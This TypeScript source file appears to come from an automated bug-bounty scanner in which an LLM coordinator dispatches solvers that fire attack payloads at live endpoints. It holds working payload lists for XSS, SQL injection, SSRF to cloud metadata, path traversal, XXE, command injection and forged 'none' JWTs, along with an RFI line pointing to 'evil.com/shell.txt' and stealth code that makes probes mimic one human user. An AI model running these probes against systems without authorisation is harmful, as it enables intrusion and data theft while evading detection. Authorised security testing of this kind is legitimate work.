/**
 * SolverPool Architecture
 * Dynamic solver spawning per endpoint-per-vuln-class.
 * Single-Brain Architecture: Strategy Coordinator is sole decision-maker
 * with confidence-driven dispatch.
 */
import { EventEmitter } from "events";
import PQueue from "p-queue";
import { v4 as uuidv4 } from "uuid";
import { exec } from "child_process";
import { promisify } from "util";
import axios from "axios";
import logger from "../utils/logger";
import { ModelRouter } from "../intelligence/ModelRouter";
import { toolKnowledge } from "../lib/hunter/tool-knowledge";
import { db } from "../db";
import { solverResults } from "../db/schema";
import { BehavioralMimicry } from "../lib/stealth/behavioral-mimicry";
import type { MimicrySession } from "../lib/stealth/behavioral-mimicry";

const execAsync = promisify(exec);

// ─── Types ────────────────────────────────────────────────────────────────────
export interface SolverTask {
  id: string;
  endpoint: string;
  vulnClass: VulnClass;
  programId: number;
  sessionId: number;
  priority: number;
  confidence: number;
  context: Record<string, unknown>;
}

export type VulnClass =
  | "xss" | "sqli" | "ssrf" | "lfi" | "rfi" | "rce" | "xxe"
  | "idor" | "auth_bypass" | "open_redirect" | "cors" | "csrf"
  | "info_disclosure" | "misconfig" | "exposed_admin" | "subdomain_takeover"
  | "rate_limit_bypass" | "business_logic" | "security_headers";

export interface SolverResult {
  taskId: string;
  solverId: string;
  endpoint: string;
  vulnClass: VulnClass;
  found: boolean;
  confidence: number;
  evidence: Record<string, unknown>;
  payload: string;
  request: string;
  response: string;
  duration: number;
  toolsUsed: string[];
}

// ─── Per-domain behavioral mimicry sessions ──────────────────────────────────
// Each domain gets a stable session (consistent UA + referrer chain) for
// the lifetime of the process, so successive probes look like the same user.
const mimicry = new BehavioralMimicry();
const domainSessions = new Map<string, MimicrySession>();

function getMimicryHeaders(url: string, overrides?: Record<string, string>): Record<string, string> {
  let hostname: string;
  try { hostname = new URL(url).hostname; } catch { hostname = url; }
  if (!domainSessions.has(hostname)) {
    domainSessions.set(hostname, mimicry.buildSession(hostname));
  }
  const session = domainSessions.get(hostname)!;
  // Use the second-to-last referrer in the chain (domain homepage → target feels natural)
  const referrer = session.referrerChain[session.referrerChain.length - 2];
  return { ...mimicry.buildHeaders(session, referrer), ...(overrides || {}) };
}

// ─── Per-domain rate limiter ──────────────────────────────────────────────────
// Shared across all solver instances: max 2 requests/second per hostname.
// Prevents concurrent solvers from hammering the same target simultaneously.
const domainQueues = new Map<string, PQueue>();

function getDomainQueue(url: string): PQueue {
  let hostname: string;
  try {
    hostname = new URL(url).hostname;
  } catch {
    hostname = url; // fallback: treat whole URL as key
  }
  if (!domainQueues.has(hostname)) {
    domainQueues.set(hostname, new PQueue({
      concurrency: 1,
      intervalCap: 2,
      interval: 1000, // 2 requests per second per domain
    }));
  }
  return domainQueues.get(hostname)!;
}

// ─── Individual Solvers ───────────────────────────────────────────────────────
abstract class BaseSolver {
  protected modelRouter = ModelRouter.getInstance();

  abstract solve(task: SolverTask): Promise<SolverResult>;

  protected async httpProbe(
    url: string,
    method: string = "GET",
    params?: Record<string, string>,
    headers?: Record<string, string>,
    body?: string
  ): Promise<{ status: number; headers: Record<string, string>; body: string }> {
    try {
      const resp = await getDomainQueue(url).add(() => axios({
        method,
        url,
        params,
        headers: getMimicryHeaders(url, headers),
        data: body,
        timeout: 10000,
        validateStatus: () => true,
        maxRedirects: 3,
      }));
      return {
        status: resp!.status,
        headers: resp!.headers as Record<string, string>,
        body: typeof resp!.data === "string" ? resp!.data.slice(0, 5000) : JSON.stringify(resp!.data).slice(0, 5000),
      };
    } catch (err: unknown) {
      const error = err as { message: string };
      return { status: 0, headers: {}, body: error.message };
    }
  }
}

class XSSSolver extends BaseSolver {
  private readonly payloads = [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "'><svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "{{7*7}}",  // SSTI check
    "${7*7}",
    "<%=7*7%>",
  ];

  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    const results: Array<{ payload: string; reflected: boolean; stored: boolean }> = [];
    let found = false;
    let bestPayload = "";
    let lastReq = "";
    let lastResp = "";

    for (const payload of this.payloads) {
      const encoded = encodeURIComponent(payload);
      const probeUrl = `${task.endpoint}?q=${encoded}&search=${encoded}&s=${encoded}`;
      const resp = await this.httpProbe(probeUrl);
      lastReq = probeUrl;
      lastResp = resp.body;

      const reflected = resp.body.includes(payload) || resp.body.includes(payload.replace(/</g, "&lt;"));
      if (reflected) {
        found = true;
        bestPayload = payload;
        results.push({ payload, reflected: true, stored: false });
        break;
      }
    }

    return {
      taskId: task.id,
      solverId: `xss-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint,
      vulnClass: "xss",
      found,
      confidence: found ? 0.85 : 0.1,
      evidence: { results, payloadsTested: this.payloads.length },
      payload: bestPayload,
      request: lastReq,
      response: lastResp.slice(0, 1000),
      duration: Date.now() - start,
      toolsUsed: ["http_probe", "xss_payload_library"],
    };
  }
}

class SQLiSolver extends BaseSolver {
  private readonly probes = [
    { payload: "' OR '1'='1", errorCheck: /sql|syntax|mysql|ora-\d+|sqlite|pg_/i },
    { payload: "1; SELECT SLEEP(2)--", errorCheck: /sql|error/i },
    { payload: "' AND 1=1--", errorCheck: /sql|error/i },
    { payload: "1 UNION SELECT NULL--", errorCheck: /sql|column|union/i },
    { payload: "' OR 1=1#", errorCheck: /sql|error/i },
    { payload: `'; WAITFOR DELAY '0:0:2'--`, errorCheck: /sql|error/i },
  ];

  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    let found = false;
    let bestPayload = "";
    let lastResp = { status: 0, headers: {} as Record<string, string>, body: "" };

    // Try sqlmap first if available
    try {
      const { stdout } = await execAsync(
        `sqlmap -u "${task.endpoint}?id=1" --batch --level=1 --risk=1 --timeout=10 --disable-coloring 2>&1 | tail -20`,
        { timeout: 30000 }
      );
      if (/is vulnerable|parameter .* is vulnerable/i.test(stdout)) {
        found = true;
        bestPayload = "sqlmap detected SQLi";
        return {
          taskId: task.id,
          solverId: `sqli-solver-${uuidv4().slice(0, 8)}`,
          endpoint: task.endpoint,
          vulnClass: "sqli",
          found: true,
          confidence: 0.92,
          evidence: { sqlmapOutput: stdout.slice(0, 1000) },
          payload: bestPayload,
          request: `sqlmap -u "${task.endpoint}?id=1"`,
          response: stdout.slice(0, 500),
          duration: Date.now() - start,
          toolsUsed: ["sqlmap"],
        };
      }
    } catch { /* sqlmap not available or timed out – fall through to manual */ }

    // Manual probing
    for (const probe of this.probes) {
      const probeUrl = `${task.endpoint}?id=${encodeURIComponent(probe.payload)}`;
      const t0 = Date.now();
      const resp = await this.httpProbe(probeUrl);
      const elapsed = Date.now() - t0;
      lastResp = resp;

      // Time-based detection
      if (elapsed > 1800 && probe.payload.includes("SLEEP")) {
        found = true;
        bestPayload = probe.payload;
        break;
      }
      // Error-based detection
      if (probe.errorCheck.test(resp.body)) {
        found = true;
        bestPayload = probe.payload;
        break;
      }
    }

    return {
      taskId: task.id,
      solverId: `sqli-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint,
      vulnClass: "sqli",
      found,
      confidence: found ? 0.8 : 0.1,
      evidence: { probesTested: this.probes.length },
      payload: bestPayload,
      request: `${task.endpoint}?id=${encodeURIComponent(bestPayload)}`,
      response: lastResp.body.slice(0, 500),
      duration: Date.now() - start,
      toolsUsed: ["http_probe", "sqli_payload_library"],
    };
  }
}

class SSRFSolver extends BaseSolver {
  private readonly ssrfPayloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://localhost:22/",
    "http://127.0.0.1:80/",
    "http://[::1]/",
    "dict://localhost:11211/",
    "gopher://localhost:25/",
    "file:///etc/passwd",
  ];

  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    let found = false;
    let bestPayload = "";
    let bestResp = "";

    for (const payload of this.ssrfPayloads) {
      for (const param of ["url", "redirect", "next", "goto", "target", "dest", "destination", "rurl", "return"]) {
        const probeUrl = `${task.endpoint}?${param}=${encodeURIComponent(payload)}`;
        const resp = await this.httpProbe(probeUrl);

        // AWS metadata detection
        if (resp.body.includes("ami-id") || resp.body.includes("instance-id")) {
          found = true;
          bestPayload = payload;
          bestResp = resp.body;
          break;
        }
        // GCP metadata detection
        if (resp.body.includes("computeMetadata") || resp.body.includes("project-id")) {
          found = true;
          bestPayload = payload;
          bestResp = resp.body;
          break;
        }
        // /etc/passwd detection
        if (resp.body.match(/root:.*:0:0:/)) {
          found = true;
          bestPayload = payload;
          bestResp = resp.body;
          break;
        }
      }
      if (found) break;
    }

    return {
      taskId: task.id,
      solverId: `ssrf-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint,
      vulnClass: "ssrf",
      found,
      confidence: found ? 0.9 : 0.05,
      evidence: { payloadsTested: this.ssrfPayloads.length },
      payload: bestPayload,
      request: bestPayload ? `${task.endpoint}?url=${encodeURIComponent(bestPayload)}` : "",
      response: bestResp.slice(0, 500),
      duration: Date.now() - start,
      toolsUsed: ["http_probe", "ssrf_payload_library"],
    };
  }
}

class IDORSolver extends BaseSolver {
  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    const results: Record<string, unknown>[] = [];
    let found = false;
    let evidence = "";

    // Extract numeric IDs from URL
    const idMatches = task.endpoint.match(/\/(\d+)/g) || [];
    if (idMatches.length === 0) {
      return {
        taskId: task.id, solverId: `idor-solver-${uuidv4().slice(0, 8)}`,
        endpoint: task.endpoint, vulnClass: "idor", found: false,
        confidence: 0.05, evidence: { reason: "No numeric IDs found in URL" },
        payload: "", request: "", response: "", duration: Date.now() - start,
        toolsUsed: [],
      };
    }

    // Test sequential ID manipulation
    const originalResp = await this.httpProbe(task.endpoint);
    for (let i = 1; i <= 5; i++) {
      const modifiedUrl = task.endpoint.replace(/\/\d+/, `/${i}`);
      if (modifiedUrl === task.endpoint) continue;
      const resp = await this.httpProbe(modifiedUrl);

      if (resp.status === 200 && resp.body.length > 100) {
        // Check if data belongs to different user
        const suspicious = resp.status === originalResp.status &&
          resp.body.length !== originalResp.body.length &&
          !resp.body.includes("unauthorized") &&
          !resp.body.includes("forbidden");

        if (suspicious) {
          found = true;
          evidence = `ID ${i} returned different user data`;
          results.push({ id: i, status: resp.status, bodyLength: resp.body.length });
        }
      }
    }

    return {
      taskId: task.id,
      solverId: `idor-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint,
      vulnClass: "idor",
      found,
      confidence: found ? 0.7 : 0.1,
      evidence: { results, idsFound: idMatches },
      payload: evidence,
      request: task.endpoint,
      response: originalResp.body.slice(0, 300),
      duration: Date.now() - start,
      toolsUsed: ["http_probe", "sequential_id_test"],
    };
  }
}

class OpenRedirectSolver extends BaseSolver {
  private readonly payloads = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "/\\evil.com",
    "https:evil.com",
    "javascript:alert(1)",
  ];

  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    const params = ["redirect", "next", "url", "goto", "return", "returnUrl", "dest", "destination", "r", "to"];
    let found = false;
    let bestPayload = "";
    let bestResp = "";

    for (const payload of this.payloads) {
      for (const param of params) {
        const resp = await this.httpProbe(
          `${task.endpoint}?${param}=${encodeURIComponent(payload)}`,
          "GET", undefined, undefined, undefined
        );

        const locationHeader = resp.headers["location"] || "";
        if (locationHeader.includes("evil.com") || locationHeader.startsWith("//evil")) {
          found = true;
          bestPayload = payload;
          bestResp = JSON.stringify(resp.headers);
          break;
        }
      }
      if (found) break;
    }

    return {
      taskId: task.id,
      solverId: `redirect-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint,
      vulnClass: "open_redirect",
      found,
      confidence: found ? 0.88 : 0.05,
      evidence: { payloadsTested: this.payloads.length * params.length },
      payload: bestPayload,
      request: found ? `${task.endpoint}?redirect=${encodeURIComponent(bestPayload)}` : "",
      response: bestResp,
      duration: Date.now() - start,
      toolsUsed: ["http_probe"],
    };
  }
}

class LFISolver extends BaseSolver {
  private readonly payloads = [
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
    "..%2Fetc%2Fpasswd", "..%252Fetc%252Fpasswd",
    "/etc/passwd%00", "php://filter/convert.base64-encode/resource=index.php",
  ];

  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    let found = false;
    let bestPayload = "";
    let bestResp = "";
    const params = ["file", "page", "include", "path", "template", "doc", "filename"];

    for (const payload of this.payloads) {
      for (const param of params) {
        const resp = await this.httpProbe(`${task.endpoint}?${param}=${encodeURIComponent(payload)}`);
        if (resp.body.match(/root:.*:0:0:/) || resp.body.includes("bin/bash")) {
          found = true; bestPayload = payload; bestResp = resp.body.slice(0, 300); break;
        }
        if (payload.includes("base64") && resp.body.match(/^[A-Za-z0-9+/=]{40,}$/m)) {
          found = true; bestPayload = `php://filter detected via ${param}`; bestResp = resp.body.slice(0, 200); break;
        }
      }
      if (found) break;
    }

    return {
      taskId: task.id, solverId: `lfi-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint, vulnClass: "lfi", found,
      confidence: found ? 0.9 : 0.05, evidence: { payloadsTested: this.payloads.length * params.length },
      payload: bestPayload, request: found ? `${task.endpoint}?file=${encodeURIComponent(bestPayload)}` : "",
      response: bestResp, duration: Date.now() - start, toolsUsed: ["http_probe", "lfi_payload_library"],
    };
  }
}

class RFISolver extends BaseSolver {
  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    let found = false;
    let evidence = "";
    const rfiPayload = "http://evil.com/shell.txt";
    const params = ["file", "page", "include", "url", "path", "template"];

    for (const param of params) {
      const resp = await this.httpProbe(`${task.endpoint}?${param}=${encodeURIComponent(rfiPayload)}`);
      // RFI if server attempted to fetch the URL (often shows connection refused or timeout to attacker domain)
      if (resp.body.includes("evil.com") || resp.status === 0) {
        found = true;
        evidence = `Param '${param}' may include remote URLs`;
        break;
      }
    }

    return {
      taskId: task.id, solverId: `rfi-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint, vulnClass: "rfi", found,
      confidence: found ? 0.7 : 0.05, evidence: { detail: evidence },
      payload: rfiPayload, request: task.endpoint, response: evidence,
      duration: Date.now() - start, toolsUsed: ["http_probe"],
    };
  }
}

class XXESolver extends BaseSolver {
  private readonly xxePayloads = [
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
    `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hostname">]><data>&file;</data>`,
  ];

  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    let found = false;
    let bestPayload = "";
    let bestResp = "";

    for (const payload of this.xxePayloads) {
      const resp = await this.httpProbe(task.endpoint, "POST", undefined, {
        "Content-Type": "application/xml",
        "Accept": "application/xml, text/xml, */*",
      }, payload);
      if (resp.body.match(/root:.*:0:0:/) || resp.body.includes("ami-id") || resp.body.includes("hostname")) {
        found = true; bestPayload = payload; bestResp = resp.body.slice(0, 500); break;
      }
    }

    return {
      taskId: task.id, solverId: `xxe-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint, vulnClass: "xxe", found,
      confidence: found ? 0.92 : 0.05, evidence: { payloadsTested: this.xxePayloads.length },
      payload: bestPayload, request: task.endpoint, response: bestResp,
      duration: Date.now() - start, toolsUsed: ["http_probe", "xxe_payload_library"],
    };
  }
}

class CORSSolver extends BaseSolver {
  private readonly testOrigins = [
    "https://evil.com", "null", "https://attacker.com",
    "https://trusted.evil.com", "http://localhost",
  ];

  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    let found = false;
    let bestOrigin = "";
    let evidence = "";

    for (const origin of this.testOrigins) {
      const resp = await this.httpProbe(task.endpoint, "GET", undefined, { "Origin": origin });
      const acao = resp.headers["access-control-allow-origin"] || "";
      const acac = resp.headers["access-control-allow-credentials"] || "";
      if (acao === origin || (acao === origin && acac === "true")) {
        found = true; bestOrigin = origin;
        evidence = `ACAO: ${acao}, ACAC: ${acac}`;
        break;
      }
    }

    return {
      taskId: task.id, solverId: `cors-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint, vulnClass: "cors", found,
      confidence: found ? 0.85 : 0.05, evidence: { originsChecked: this.testOrigins.length, detail: evidence },
      payload: bestOrigin, request: `${task.endpoint} [Origin: ${bestOrigin}]`, response: evidence,
      duration: Date.now() - start, toolsUsed: ["http_probe", "cors_origin_testing"],
    };
  }
}

class CSRFSolver extends BaseSolver {
  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    let found = false;
    const leaks: Record<string, unknown> = {};

    for (const method of ["POST", "PUT", "PATCH", "DELETE"]) {
      const resp = await this.httpProbe(task.endpoint, method, undefined, {
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://evil.com",
      }, "action=test&value=csrf_probe");

      const hasToken = resp.body.toLowerCase().includes("csrf") || resp.body.includes("_token");
      const noSameSite = !(resp.headers["set-cookie"] || "").toLowerCase().includes("samesite");

      if (!hasToken && resp.status < 400 && noSameSite) {
        found = true;
        leaks[method] = { status: resp.status, missingCSRFToken: true, noSameSite };
      }
    }

    return {
      taskId: task.id, solverId: `csrf-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint, vulnClass: "csrf", found,
      confidence: found ? 0.75 : 0.1, evidence: leaks,
      payload: "Cross-origin state-changing request without CSRF token",
      request: task.endpoint, response: JSON.stringify(leaks).slice(0, 500),
      duration: Date.now() - start, toolsUsed: ["http_probe", "csrf_detection"],
    };
  }
}

class AuthBypassSolver extends BaseSolver {
  private readonly bypassHeaders: Record<string, string>[] = [
    { "X-Original-URL": "/admin" },
    { "X-Forwarded-For": "127.0.0.1" },
    { "X-Remote-IP": "127.0.0.1" },
    { "X-Client-IP": "127.0.0.1" },
    { "X-Real-IP": "127.0.0.1" },
  ];

  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    let found = false;
    let bypassHeader: Record<string, string> = {};
    let evidence = "";

    const baseline = await this.httpProbe(task.endpoint);
    const baseStatus = baseline.status;

    for (const headers of this.bypassHeaders) {
      const resp = await this.httpProbe(task.endpoint, "GET", undefined, headers);
      if ((baseStatus === 401 || baseStatus === 403) && resp.status === 200) {
        found = true; bypassHeader = headers;
        evidence = `Bypass via ${JSON.stringify(headers)}: ${baseStatus}→${resp.status}`;
        break;
      }
    }

    if (!found) {
      const noneJwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.";
      const resp = await this.httpProbe(task.endpoint, "GET", undefined, { "Authorization": `Bearer ${noneJwt}` });
      if (resp.status === 200 && baseStatus !== 200) {
        found = true; evidence = "JWT 'none' algorithm accepted";
      }
    }

    return {
      taskId: task.id, solverId: `authbypass-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint, vulnClass: "auth_bypass", found,
      confidence: found ? 0.88 : 0.05, evidence: { detail: evidence, baselineStatus: baseStatus },
      payload: JSON.stringify(bypassHeader), request: task.endpoint, response: evidence,
      duration: Date.now() - start, toolsUsed: ["http_probe", "header_injection", "jwt_testing"],
    };
  }
}

class MisconfigSolver extends BaseSolver {
  private readonly sensitiveFiles = [
    "/.env", "/.git/config", "/config.json", "/wp-config.php",
    "/phpinfo.php", "/.htaccess", "/web.config", "/Dockerfile",
    "/docker-compose.yml", "/.aws/credentials", "/backup.sql",
    "/config/database.yml", "/server-status",
  ];

  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    const exposedFiles: string[] = [];
    const base = (() => { try { return new URL(task.endpoint).origin; } catch { return task.endpoint; } })();

    for (const path of this.sensitiveFiles) {
      const resp = await this.httpProbe(`${base}${path}`);
      if (resp.status === 200 && resp.body.length > 50) {
        const isSensitive = resp.body.includes("DB_") || resp.body.includes("password") ||
          resp.body.includes("[core]") || resp.body.includes("<?php") ||
          resp.body.includes("ServerRoot") || resp.body.includes("DOCUMENT_ROOT");
        if (isSensitive) exposedFiles.push(path);
      }
    }

    const found = exposedFiles.length > 0;
    return {
      taskId: task.id, solverId: `misconfig-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint, vulnClass: "misconfig", found,
      confidence: found ? 0.92 : 0.05,
      evidence: { exposedFiles, testedPaths: this.sensitiveFiles.length },
      payload: exposedFiles.join(", "),
      request: exposedFiles.map(f => `${base}${f}`).join("\n"),
      response: found ? `Exposed: ${exposedFiles.join(", ")}` : "None found",
      duration: Date.now() - start, toolsUsed: ["http_probe", "sensitive_file_discovery"],
    };
  }
}

class RCESolver extends BaseSolver {
  private readonly probes = [
    { payload: "; id", pattern: /uid=\d+.*gid=\d+/ },
    { payload: "| id", pattern: /uid=\d+.*gid=\d+/ },
    { payload: "`id`", pattern: /uid=\d+.*gid=\d+/ },
    { payload: "$(id)", pattern: /uid=\d+.*gid=\d+/ },
    { payload: "{{7*7}}", pattern: /49/ },
    { payload: "${7*7}", pattern: /49/ },
    { payload: "<%=7*7%>", pattern: /49/ },
  ];

  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    let found = false;
    let bestPayload = "";
    let bestResp = "";
    const params = ["cmd", "exec", "command", "run", "ping", "host", "q", "query", "input"];

    for (const probe of this.probes) {
      for (const param of params) {
        const resp = await this.httpProbe(`${task.endpoint}?${param}=${encodeURIComponent(probe.payload)}`);
        if (probe.pattern.test(resp.body)) {
          found = true; bestPayload = probe.payload; bestResp = resp.body.slice(0, 500); break;
        }
      }
      if (found) break;
    }

    return {
      taskId: task.id, solverId: `rce-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint, vulnClass: "rce", found,
      confidence: found ? 0.95 : 0.05, evidence: { probesTested: this.probes.length * params.length },
      payload: bestPayload, request: found ? `${task.endpoint}?cmd=${encodeURIComponent(bestPayload)}` : "",
      response: bestResp, duration: Date.now() - start, toolsUsed: ["http_probe", "rce_payload_library"],
    };
  }
}

class InfoDisclosureSolver extends BaseSolver {
  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    const leaks: string[] = [];
    const resp = await this.httpProbe(task.endpoint);
    const body = resp.body;

    if (/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(body)) leaks.push("email addresses");
    if (/-----BEGIN (RSA |EC )?PRIVATE KEY-----/.test(body)) leaks.push("private keys");
    if (/AKIA[0-9A-Z]{16}/.test(body)) leaks.push("AWS access keys");
    if (/"password"\s*:\s*"[^"]+"/.test(body)) leaks.push("plaintext passwords");
    if (/stack trace|at \w+\.\w+\(\w+\.java:\d+\)|Traceback/i.test(body)) leaks.push("stack traces");
    if (/SQL syntax|mysql_fetch|ORA-\d+|pg_query/i.test(body)) leaks.push("database errors");

    const serverHeader = resp.headers["server"] || "";
    if (/Apache\/[\d.]+|nginx\/[\d.]+|IIS\/[\d.]+/.test(serverHeader)) leaks.push(`version: ${serverHeader}`);
    if (resp.headers["x-powered-by"]) leaks.push(`x-powered-by: ${resp.headers["x-powered-by"]}`);

    const found = leaks.length > 0;
    return {
      taskId: task.id, solverId: `infodisclosure-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint, vulnClass: "info_disclosure", found,
      confidence: found ? 0.8 : 0.05, evidence: { leaks },
      payload: leaks.join(", "), request: task.endpoint, response: body.slice(0, 500),
      duration: Date.now() - start, toolsUsed: ["http_probe", "pattern_matching"],
    };
  }
}

// Solver registry
const SOLVER_REGISTRY: Partial<Record<VulnClass, new () => BaseSolver>> = {
  xss: XSSSolver,
  sqli: SQLiSolver,
  ssrf: SSRFSolver,
  idor: IDORSolver,
  open_redirect: OpenRedirectSolver,
  lfi: LFISolver,
  rfi: RFISolver,
  xxe: XXESolver,
  cors: CORSSolver,
  csrf: CSRFSolver,
  auth_bypass: AuthBypassSolver,
  misconfig: MisconfigSolver,
  rce: RCESolver,
  info_disclosure: InfoDisclosureSolver,
};

// ─── Strategy Coordinator (Single Brain) ──────────────────────────────────────

/** Truncate the observations object to avoid exceeding the model context window.
 *  Keeps the top-level keys but summarises deep arrays to a count + sample. */
function summariseObservations(raw: Record<string, unknown>, maxChars = 1200): string {
  const full = JSON.stringify(raw, null, 2);
  if (full.length <= maxChars) return full;

  const condensed: Record<string, unknown> = {};
  for (const [k, v] of Object.entries(raw)) {
    if (Array.isArray(v)) {
      condensed[k] = v.length <= 3 ? v : [...v.slice(0, 2), `…(${v.length - 2} more)`];
    } else if (v && typeof v === 'object') {
      const s = JSON.stringify(v);
      condensed[k] = s.length > 200 ? s.slice(0, 200) + '…' : v;
    } else {
      condensed[k] = v;
    }
  }
  return JSON.stringify(condensed, null, 2).slice(0, maxChars);
}

class StrategyCoordinator {
  private modelRouter = ModelRouter.getInstance();

  async dispatch(endpoint: string, observations: Record<string, unknown>): Promise<SolverTask[]> {
    const prompt = `You are a bug bounty strategy coordinator analyzing an endpoint.

Endpoint: ${endpoint}
Observations: ${summariseObservations(observations)}

${toolKnowledge.getSummaryBlock()}

Determine which vulnerability classes to test. Consider:
- What technologies are present?
- What parameters does the endpoint accept?
- What is the likely attack surface?
- Historical success rates

Return a JSON array of objects with:
- vulnClass: the vulnerability class to test
- priority: 1-10 (10=highest)
- confidence: 0.0-1.0 (likelihood of finding)
- reasoning: why this vuln class applies

Only include vuln classes with confidence > 0.3. Maximum 5 tasks.
Return ONLY the JSON array.`;

    try {
      const response = await this.modelRouter.reason(prompt);
      const tasks = JSON.parse(response.match(/\[[\s\S]+\]/)?.[0] || "[]");
      return tasks.map((t: Record<string, unknown>) => ({
        id: uuidv4(),
        endpoint,
        vulnClass: t.vulnClass as VulnClass,
        programId: 0,
        sessionId: 0,
        priority: Number(t.priority) || 5,
        confidence: Number(t.confidence) || 0.5,
        context: { reasoning: t.reasoning, observations },
      }));
    } catch {
      // Fallback: default high-value targets
      return ["xss", "sqli", "idor", "ssrf", "open_redirect"].map(vc => ({
        id: uuidv4(),
        endpoint,
        vulnClass: vc as VulnClass,
        programId: 0,
        sessionId: 0,
        priority: 5,
        confidence: 0.4,
        context: {},
      }));
    }
  }
}

// ─── SolverPool ───────────────────────────────────────────────────────────────
export class SolverPool extends EventEmitter {
  private queue: PQueue;
  private coordinator = new StrategyCoordinator();
  private activeJobs = new Map<string, SolverTask>();
  private results: SolverResult[] = [];

  constructor(concurrency: number = 5) {
    super();
    this.queue = new PQueue({ concurrency });
  }

  async spawnSolvers(
    endpoint: string,
    observations: Record<string, unknown>,
    options: { programId: number; sessionId: number } = { programId: 0, sessionId: 0 }
  ): Promise<SolverResult[]> {
    logger.info("SolverPool: Spawning solvers", { endpoint });

    // Strategy Coordinator decides what to test
    const tasks = await this.coordinator.dispatch(endpoint, observations);
    tasks.forEach(t => { t.programId = options.programId; t.sessionId = options.sessionId; });

    this.emit("solvers:spawned", { count: tasks.length, endpoint });

    // Enqueue all tasks in parallel
    const promises = tasks.map(task => {
      this.activeJobs.set(task.id, task);
      this.emit("solver:started", { taskId: task.id, vulnClass: task.vulnClass });

      return this.queue.add(async () => {
        const SolverClass = SOLVER_REGISTRY[task.vulnClass];
        if (!SolverClass) {
          logger.warn(`No solver for ${task.vulnClass}, using generic HTTP probe`);
          return null;
        }

        const solver = new SolverClass();
        try {
          const result = await solver.solve(task);
          this.activeJobs.delete(task.id);
          this.emit("solver:complete", { taskId: task.id, found: result.found, confidence: result.confidence });

          // Persist result
          await this.persistResult(result, options.sessionId);
          if (result.found) {
            this.emit("solver:finding", { result });
            this.results.push(result);
          }
          return result;
        } catch (err) {
          logger.error("Solver error", { taskId: task.id, vulnClass: task.vulnClass, err });
          this.activeJobs.delete(task.id);
          return null;
        }
      });
    });

    const allResults = await Promise.all(promises);
    return allResults.filter(Boolean) as SolverResult[];
  }

  private async persistResult(result: SolverResult, sessionId: number): Promise<void> {
    try {
      await db.insert(solverResults).values({
        huntSessionId: sessionId,
        solverId: result.solverId,
        endpoint: result.endpoint,
        vulnClass: result.vulnClass,
        result: result as unknown as Record<string, unknown>,
        confidence: result.confidence,
        duration: result.duration,
        toolsUsed: result.toolsUsed,
        status: result.found ? "found" : "clean",
      });
    } catch (err) {
      logger.error("Failed to persist solver result", { err });
    }
  }

  getActiveJobs(): SolverTask[] {
    return [...this.activeJobs.values()];
  }

  getResults(): SolverResult[] {
    return this.results;
  }

  getStats(): { queued: number; running: number; completed: number } {
    return {
      queued: this.queue.size,
      running: this.queue.pending,
      completed: this.results.length,
    };
  }
}

export default SolverPool;
